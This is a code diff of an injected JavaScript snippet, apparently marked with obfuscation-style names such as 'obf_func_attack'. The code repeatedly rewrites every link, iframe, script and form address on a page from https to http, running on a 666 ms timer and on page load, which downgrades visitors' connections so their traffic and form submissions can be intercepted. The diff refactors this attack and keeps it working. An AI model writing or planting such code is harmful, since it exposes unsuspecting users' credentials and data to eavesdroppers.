@@ -6,12 +6,21 @@
 	}
 })();
 
-setInterval(function(){
-	try {
-		document.querySelectorAll("a,link,iframe,script,form").forEach(function(obf_var_node){
-			obf_var_node.src.match(/https/i) ? obf_var_node.src = obf_var_node.src.replace(/(http)s/ig, "$1") : "";
-			obf_var_node.href.match(/https/i) ? obf_var_node.href = obf_var_node.href.replace(/(http)s/ig, "$1") : "";
-			obf_var_node.action.match(/https/i) ? obf_var_node.action = obf_var_node.action.replace(/(http)s/ig, "$1") : "";
-		});
-	} catch(ignore){}
-}, 666);
+function obf_func_attack() {
+	document.querySelectorAll("a,iframe,script,form").forEach(function(obf_var_node){
+		switch (obf_var_node.tagName) {
+			case "A": obf_var_node.href && obf_var_node.href.match(/https/i) ? obf_var_node.href = obf_var_node.href.replace(/(http)s/ig, "$1") : ""; break;
+			case "IFRAME": obf_var_node.src && obf_var_node.src.match(/https/i) ? obf_var_node.src = obf_var_node.src.replace(/(http)s/ig, "$1") : ""; break;
+			case "SCRIPT": obf_var_node.src && obf_var_node.src.match(/https/i) ? obf_var_node.src = obf_var_node.src.replace(/(http)s/ig, "$1") : ""; break;
+			case "FORM": obf_var_node.action && obf_var_node.action.match(/https/i) ? obf_var_node.action = obf_var_node.action.replace(/(http)s/ig, "$1") : ""; break;
+		}
+	});
+}
+
+setInterval(obf_func_attack, 666);
+
+try {
+	document.addEventListener("DOMContentLoaded", obf_func_attack);
+} catch(obf_ignore) {
+	self.addEventListener("load", obf_func_attack);
+}
